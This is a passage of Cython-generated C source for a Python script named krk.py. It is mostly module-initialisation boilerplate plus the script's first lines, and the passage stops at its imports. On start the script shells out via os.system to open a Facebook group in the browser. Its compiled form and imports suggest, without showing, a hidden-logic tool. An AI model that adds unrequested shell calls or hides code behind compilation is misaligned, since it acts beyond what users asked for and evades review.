  __pyx_ptype_3krk___pyx_scope_struct_2_genexpr = &__pyx_type_3krk___pyx_scope_struct_2_genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_3krk___pyx_scope_struct_2_genexpr) < 0) __PYX_ERR(0, 314, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_3krk___pyx_scope_struct_2_genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_3krk___pyx_scope_struct_2_genexpr->tp_dictoffset && __pyx_ptype_3krk___pyx_scope_struct_2_genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_3krk___pyx_scope_struct_2_genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_3krk___pyx_scope_struct_3_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_3krk___pyx_scope_struct_3_genexpr_spec, NULL); if (unlikely(!__pyx_ptype_3krk___pyx_scope_struct_3_genexpr)) __PYX_ERR(0, 317, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_3krk___pyx_scope_struct_3_genexpr_spec, __pyx_ptype_3krk___pyx_scope_struct_3_genexpr) < 0) __PYX_ERR(0, 317, __pyx_L1_error)
  #else
  __pyx_ptype_3krk___pyx_scope_struct_3_genexpr = &__pyx_type_3krk___pyx_scope_struct_3_genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_3krk___pyx_scope_struct_3_genexpr) < 0) __PYX_ERR(0, 317, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_3krk___pyx_scope_struct_3_genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_3krk___pyx_scope_struct_3_genexpr->tp_dictoffset && __pyx_ptype_3krk___pyx_scope_struct_3_genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_3krk___pyx_scope_struct_3_genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_3krk___pyx_scope_struct_4_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_3krk___pyx_scope_struct_4_genexpr_spec, NULL); if (unlikely(!__pyx_ptype_3krk___pyx_scope_struct_4_genexpr)) __PYX_ERR(0, 422, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_3krk___pyx_scope_struct_4_genexpr_spec, __pyx_ptype_3krk___pyx_scope_struct_4_genexpr) < 0) __PYX_ERR(0, 422, __pyx_L1_error)
  #else
  __pyx_ptype_3krk___pyx_scope_struct_4_genexpr = &__pyx_type_3krk___pyx_scope_struct_4_genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_3krk___pyx_scope_struct_4_genexpr) < 0) __PYX_ERR(0, 422, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_3krk___pyx_scope_struct_4_genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_3krk___pyx_scope_struct_4_genexpr->tp_dictoffset && __pyx_ptype_3krk___pyx_scope_struct_4_genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_3krk___pyx_scope_struct_4_genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_3krk___pyx_scope_struct_5_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_3krk___pyx_scope_struct_5_genexpr_spec, NULL); if (unlikely(!__pyx_ptype_3krk___pyx_scope_struct_5_genexpr)) __PYX_ERR(0, 528, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_3krk___pyx_scope_struct_5_genexpr_spec, __pyx_ptype_3krk___pyx_scope_struct_5_genexpr) < 0) __PYX_ERR(0, 528, __pyx_L1_error)
  #else
  __pyx_ptype_3krk___pyx_scope_struct_5_genexpr = &__pyx_type_3krk___pyx_scope_struct_5_genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_3krk___pyx_scope_struct_5_genexpr) < 0) __PYX_ERR(0, 528, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_3krk___pyx_scope_struct_5_genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_3krk___pyx_scope_struct_5_genexpr->tp_dictoffset && __pyx_ptype_3krk___pyx_scope_struct_5_genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_3krk___pyx_scope_struct_5_genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  #if CYTHON_USE_TYPE_SPECS
  __pyx_ptype_3krk___pyx_scope_struct_6_genexpr = (PyTypeObject *) __Pyx_PyType_FromModuleAndSpec(__pyx_m, &__pyx_type_3krk___pyx_scope_struct_6_genexpr_spec, NULL); if (unlikely(!__pyx_ptype_3krk___pyx_scope_struct_6_genexpr)) __PYX_ERR(0, 619, __pyx_L1_error)
  if (__Pyx_fix_up_extension_type_from_spec(&__pyx_type_3krk___pyx_scope_struct_6_genexpr_spec, __pyx_ptype_3krk___pyx_scope_struct_6_genexpr) < 0) __PYX_ERR(0, 619, __pyx_L1_error)
  #else
  __pyx_ptype_3krk___pyx_scope_struct_6_genexpr = &__pyx_type_3krk___pyx_scope_struct_6_genexpr;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  #endif
  #if !CYTHON_USE_TYPE_SPECS
  if (__Pyx_PyType_Ready(__pyx_ptype_3krk___pyx_scope_struct_6_genexpr) < 0) __PYX_ERR(0, 619, __pyx_L1_error)
  #endif
  #if PY_MAJOR_VERSION < 3
  __pyx_ptype_3krk___pyx_scope_struct_6_genexpr->tp_print = 0;
  #endif
  #if !CYTHON_COMPILING_IN_LIMITED_API
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_ptype_3krk___pyx_scope_struct_6_genexpr->tp_dictoffset && __pyx_ptype_3krk___pyx_scope_struct_6_genexpr->tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_ptype_3krk___pyx_scope_struct_6_genexpr->tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  #endif
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_krk(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_krk},
  {0, NULL}
};
#endif

#ifdef __cplusplus
namespace {
  struct PyModuleDef __pyx_moduledef =
  #else
  static struct PyModuleDef __pyx_moduledef =
  #endif
  {
      PyModuleDef_HEAD_INIT,
      "krk",
      0, /* m_doc */
    #if CYTHON_PEP489_MULTI_PHASE_INIT
      0, /* m_size */
    #elif CYTHON_USE_MODULE_STATE
      sizeof(__pyx_mstate), /* m_size */
    #else
      -1, /* m_size */
    #endif
      __pyx_methods /* m_methods */,
    #if CYTHON_PEP489_MULTI_PHASE_INIT
      __pyx_moduledef_slots, /* m_slots */
    #else
      NULL, /* m_reload */
    #endif
    #if CYTHON_USE_MODULE_STATE
      __pyx_m_traverse, /* m_traverse */
      __pyx_m_clear, /* m_clear */
      NULL /* m_free */
    #else
      NULL, /* m_traverse */
      NULL, /* m_clear */
      NULL /* m_free */
    #endif
  };
  #ifdef __cplusplus
} /* anonymous namespace */
#endif
#endif

#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initkrk(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initkrk(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_krk(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_krk(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
#if CYTHON_COMPILING_IN_LIMITED_API
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *module, const char* from_name, const char* to_name, int allow_none)
#else
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none)
#endif
{
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
#if CYTHON_COMPILING_IN_LIMITED_API
            result = PyModule_AddObject(module, to_name, value);
#else
            result = PyDict_SetItemString(moddict, to_name, value);
#endif
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    CYTHON_UNUSED_VAR(def);
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
#if CYTHON_COMPILING_IN_LIMITED_API
    moddict = module;
#else
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
#endif
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_krk(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  int stringtab_initialized = 0;
  #if CYTHON_USE_MODULE_STATE
  int pystate_addmodule_run = 0;
  #endif
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  long __pyx_t_10;
  Py_ssize_t __pyx_t_11;
  Py_UCS4 __pyx_t_12;
  int __pyx_t_13;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'krk' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("krk", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #elif CYTHON_USE_MODULE_STATE
  __pyx_t_1 = PyModule_Create(&__pyx_moduledef); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  {
    int add_module_result = PyState_AddModule(__pyx_t_1, &__pyx_moduledef);
    __pyx_t_1 = 0; /* transfer ownership from __pyx_t_1 to krk pseudovariable */
    if (unlikely((add_module_result < 0))) __PYX_ERR(0, 1, __pyx_L1_error)
    pystate_addmodule_run = 1;
  }
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #endif
  CYTHON_UNUSED_VAR(__pyx_t_1);
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_krk(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  stringtab_initialized = 1;
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_krk) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "krk")) {
      if (unlikely((PyDict_SetItemString(modules, "krk", __pyx_m) < 0))) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  if (unlikely((__Pyx_modinit_type_init_code() < 0))) __PYX_ERR(0, 1, __pyx_L1_error)
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

  /* "krk.py":1
 * from os import path             # <<<<<<<<<<<<<<
 * import os,base64,zlib,pip,urllib
 * os.system('xdg-open https://facebook.com/groups/351076900316263/')
 */
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_path);
  __Pyx_GIVEREF(__pyx_n_s_path);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_path);
  __pyx_t_3 = __Pyx_Import(__pyx_n_s_os, __pyx_t_2, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_path, __pyx_t_2) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "krk.py":2
 * from os import path
 * import os,base64,zlib,pip,urllib             # <<<<<<<<<<<<<<
 * os.system('xdg-open https://facebook.com/groups/351076900316263/')
 * print('\n\033[1;37m install modules...\n It will take some seconds...')
 */
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_os, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_3) < 0) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_base64, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_3) < 0) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_zlib, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_zlib, __pyx_t_3) < 0) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_pip, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pip, __pyx_t_3) < 0) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_urllib, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_urllib, __pyx_t_3) < 0) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "krk.py":3
 * from os import path
 * import os,base64,zlib,pip,urllib
 * os.system('xdg-open https://facebook.com/groups/351076900316263/')             # <<<<<<<<<<<<<<
 * print('\n\033[1;37m install modules...\n It will take some seconds...')
 * 
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__82, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "krk.py":4
 * import os,base64,zlib,pip,urllib
 * os.system('xdg-open https://facebook.com/groups/351076900316263/')
 * print('\n\033[1;37m install modules...\n It will take some seconds...')             # <<<<<<<<<<<<<<
 * 
 * try:
 */
  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__83, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "krk.py":6
 * print('\n\033[1;37m install modules...\n It will take some seconds...')
 * 
 * try:             # <<<<<<<<<<<<<<
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 *         from string import *
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      /* "krk.py":7
 * 
 * try:
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess             # <<<<<<<<<<<<<<
 *         from string import *
 *         from concurrent.futures import ThreadPoolExecutor as tred
 */
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_os, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_requests, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_json, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_time, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_re, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_re, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_random, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_sys, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_uuid, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
